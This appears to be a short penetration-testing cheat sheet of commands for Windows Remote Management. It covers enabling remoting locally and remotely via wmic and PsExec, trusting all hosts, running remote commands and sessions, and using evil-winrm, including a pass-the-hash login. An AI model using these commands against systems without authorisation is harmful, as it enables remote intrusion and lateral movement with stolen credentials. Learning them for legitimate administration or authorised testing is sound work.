# winrm

% windows, remote, winrm, evilwinrm, 5985, 5986

## enable winrm (powershell)
```
Enable-PSRemoting -Force  
Set-Item wsman:\localhost\client\trustedhosts *  
```

## enable winrm (wmic)
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```

## test target is configure to use winrm (powershell)
```
Test-WSMan -computername <computername>
```

## execute a command on the target over winrm (powershell)
```
Invoke-Command -computername <computername> -ScriptBlock {<cmd>} -credential <domain>\<username>
```

## Execute a script on the target over winrm (powershell)
```
Invoke-Command -ComputerName <computername> -FilePath <path_to_script> -credential <domain>\<username>
```

## Get a powershell session with winrm (powershell)
```
Enter-PSSession -ComputerName <computername> -Credential <domain>\<username>
```

## Enable winrm remotelly from psexec
```
.\PsExec.exe \\<computername> -u <domain>\<username> -p <password> -h -d powershell.exe "enable-psremoting -force"  
```

## evil-winrm install
```
gem install evil-winrm
```

## evil-winrm use
```
evil-winrm -i <ip>/<domain> -u <user> -p <password>
```

## evil-winrm use pass the hash
```
evil-winrm -i <ip>/<domain> -u <user> -H <hash>
```